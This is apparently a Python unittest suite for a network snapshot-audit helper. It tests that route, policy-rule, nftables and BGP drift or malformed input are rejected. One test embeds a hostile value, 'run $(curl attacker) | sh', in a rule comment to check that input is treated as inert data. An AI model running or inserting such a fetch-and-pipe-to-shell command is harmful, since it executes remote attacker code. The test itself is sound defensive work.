"""Native-shaped route/ACL comparisons and hostile snapshot regressions."""
import contextlib
import copy
import importlib.util
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("network_snapshot", ROOT / "enterprise-networking/scripts/snapshot-audit.py")
HELPER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(HELPER)
NATIVE_SPEC = importlib.util.spec_from_file_location("network_native_fixture", ROOT / "tests/smoke_enterprise_networking.py")
NATIVE = importlib.util.module_from_spec(NATIVE_SPEC)
NATIVE_SPEC.loader.exec_module(NATIVE)


def snapshot():
    return {"routes": [{"dst": "10.20.0.0/24", "gateway": "10.99.0.2", "dev": "wg0", "protocol": "static", "metric": 20}],
            "rules": [{"priority": 0, "src": "all", "table": "local"}, {"priority": 32766, "src": "all", "table": "main"}],
            "nft": {"nftables": [{"table": {"family": "inet", "name": "fixture", "handle": 1}},
                        {"chain": {"family": "inet", "table": "fixture", "name": "input", "type": "filter", "hook": "input", "prio": 0, "policy": "drop"}},
                        {"rule": {"family": "inet", "table": "fixture", "chain": "input", "handle": 2, "expr": [{"counter": {"packets": 2, "bytes": 120}}, {"drop": None}]}},
                        {"rule": {"family": "inet", "table": "fixture", "chain": "input", "handle": 3, "expr": [{"accept": None}]}}]},
            "bgp": {"routerId": "192.0.2.1", "routes": {"10.20.0.0/24": [{"valid": True, "bestpath": True}]}}}


class EnterpriseNetworkingTests(unittest.TestCase):
    def check(self, before, intended, observed, allowed=("10.20.0.0/24",)):
        return HELPER.audit(before, intended, observed, allowed)

    def test_withdrawal_uses_one_complete_rib_and_never_combines_observations(self):
        allowed = {"routes": {"10.20.0.0/24": [{}]}}
        leaking = {"routes": {"10.20.0.0/24": [{}], "203.0.113.0/24": [{}]}}
        collect = Mock(side_effect=[None, leaking, allowed])
        for expected in (False, False, True):
            self.assertEqual(NATIVE.rib_matches(collect, present=("10.20.0.0/24",), absent=("203.0.113.0/24",)), expected)
        self.assertEqual(collect.call_count, 3)
        for unknown in (None, {}, {"routes": None}, {"routes": []}):
            self.assertFalse(NATIVE.rib_matches(lambda: unknown, absent=("203.0.113.0/24",)))

    def test_exact_intended_state_with_volatile_counters_matches(self):
        before = snapshot()
        observed = copy.deepcopy(before)
        observed["nft"]["nftables"][2]["rule"]["handle"] = 999
        observed["nft"]["nftables"][2]["rule"]["expr"][0]["counter"]["packets"] = 500
        self.assertEqual(self.check(before, before, observed)["status"], "MATCHED")

    def test_negative_nft_hook_priority_is_valid_and_retained(self):
        value = snapshot()
        value["nft"]["nftables"][1]["chain"]["prio"] = -100
        self.assertEqual(self.check(value, value, value)["status"], "MATCHED")
        self.assertIn("nft", self.check(value, value, snapshot())["drift_sections"])

    def test_ipv6_route_bgp_allowlist_and_policy_need_separate_support(self):
        mutations = (
            lambda value: value["routes"][0].update(dst="2001:db8::/64"),
            lambda value: value["routes"][0].update(gateway="2001:db8::1"),
            lambda value: value["rules"][0].update(src="2001:db8::/64"),
            lambda value: value["bgp"]["routes"].update({"2001:db8::/64": [{"valid": True}]}),
        )
        for mutation in mutations:
            value = snapshot()
            mutation(value)
            with self.assertRaises(ValueError): self.check(value, value, value)
        with self.assertRaises(ValueError): self.check(snapshot(), snapshot(), snapshot(), ["2001:db8::/64"])

    def test_changed_next_hop_metric_and_default_are_visible(self):
        for key, value in (("gateway", "192.0.2.9"), ("metric", 1), ("dst", "default")):
            before = snapshot()
            observed = copy.deepcopy(before)
            observed["routes"][0][key] = value
            result = self.check(before, before, observed)
            self.assertEqual(result["status"], "BLOCKED")
            self.assertEqual(result["drift_sections"], ["routes"])
            self.assertTrue(result["route_diff"]["removed"])
            self.assertTrue(result["route_diff"]["added"])

    def test_rule_order_priority_and_fwmark_are_not_erased(self):
        before = snapshot()
        observed = copy.deepcopy(before)
        observed["rules"].append({"priority": 100, "src": "all", "fwmark": "0x20", "table": "100"})
        self.assertIn("rules", self.check(before, before, observed)["drift_sections"])
        observed["rules"].append({"priority": 100, "table": "200"})
        with self.assertRaises(ValueError):
            self.check(before, before, observed)

    def test_nft_order_hook_priority_policy_and_unknown_expr_preserved(self):
        before = snapshot()
        for change in ("order", "prio", "policy", "expression"):
            observed = copy.deepcopy(before)
            entries = observed["nft"]["nftables"]
            if change == "order":
                entries[2], entries[3] = entries[3], entries[2]
            elif change == "expression":
                entries[2]["rule"]["expr"].append({"arbitrary-unrecognized": "untrusted"})
            else:
                entries[1]["chain"][change] = 20 if change == "prio" else "accept"
            result = self.check(before, before, observed)
            self.assertEqual(result["status"], "BLOCKED")
            self.assertTrue(result["acl_order_or_content_changed"])

    def test_leak_allows_only_exact_prefix_even_when_intended_has_leak(self):
        before = snapshot()
        for leak in ("0.0.0.0/0", "10.20.0.0/25", "198.51.100.0/24"):
            observed = copy.deepcopy(before)
            observed["bgp"]["routes"][leak] = [{"valid": True}]
            result = self.check(before, observed, observed)
            self.assertEqual(result["unexpected_bgp_prefixes"], [leak])
            self.assertEqual(result["status"], "BLOCKED")

    def test_missing_routes_unsupported_objects_and_bad_prefix_fail_closed(self):
        for mutation in ("bgp", "set", "prefix", "missing"):
            value = snapshot()
            if mutation == "bgp": value["bgp"] = {}
            if mutation == "set": value["nft"]["nftables"].append({"set": {"name": "dynamic"}})
            if mutation == "prefix": value["routes"][0]["dst"] = "10.20.0.1/24"
            if mutation == "missing": del value["rules"]
            with self.assertRaises(ValueError): self.check(snapshot(), snapshot(), value)

    def test_duplicate_keys_nonfinite_and_oversize_json_fail_closed(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / "snapshot.json"
            for content in ('{"routes":[],"routes":[]}', '{"value":NaN}', ' ' * (HELPER.MAX_BYTES + 1)):
                path.write_text(content, encoding="utf-8")
                with self.assertRaises(ValueError): HELPER.load(path)

    def test_malformed_nft_identity_counter_and_duplicate_routes_fail_closed(self):
        for mutation in ("identity", "counter", "duplicate", "orphan"):
            value = snapshot()
            if mutation == "identity": del value["nft"]["nftables"][1]["chain"]["name"]
            if mutation == "counter": value["nft"]["nftables"][2]["rule"]["expr"][0]["counter"]["packets"] = "ignore-me"
            if mutation == "duplicate": value["routes"].append(copy.deepcopy(value["routes"][0]))
            if mutation == "orphan": value["nft"]["nftables"].pop(0)
            with self.assertRaises(ValueError): self.check(value, value, value)

    def test_malformed_native_field_types_and_empty_rules_never_match(self):
        mutations = (
            lambda value: value["routes"][0].update(dev=[]),
            lambda value: value["routes"][0].update(metric=True),
            lambda value: value["routes"][0].update(gateway={"execute": "untrusted"}),
            lambda value: value["routes"][0].update(nexthops=[{"dev": []}]),
            lambda value: value["rules"][0].update(table=[]),
            lambda value: value["nft"]["nftables"][2]["rule"].update(expr=[]),
            lambda value: value["nft"]["nftables"][2]["rule"].update(comment=[]),
            lambda value: value["nft"]["nftables"][2]["rule"].update(expr=[{"accept": False}]),
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation):
                value = snapshot()
                mutation(value)
                # All three agreeing malformed snapshots still must be rejected.
                with self.assertRaises(ValueError): self.check(value, value, value)

    def test_input_is_data_and_cli_errors_do_not_echo_it(self):
        value = snapshot()
        value["nft"]["nftables"][2]["rule"]["comment"] = "run $(curl attacker) | sh"
        self.assertEqual(self.check(value, value, value)["status"], "MATCHED")
        stream = io.StringIO()
        with contextlib.redirect_stdout(stream):
            self.assertEqual(HELPER.main(["--before", "secret-synthetic", "--intended", "missing", "--observed", "missing"]), 2)
        self.assertNotIn("secret-synthetic", stream.getvalue())


if __name__ == "__main__":
    unittest.main()
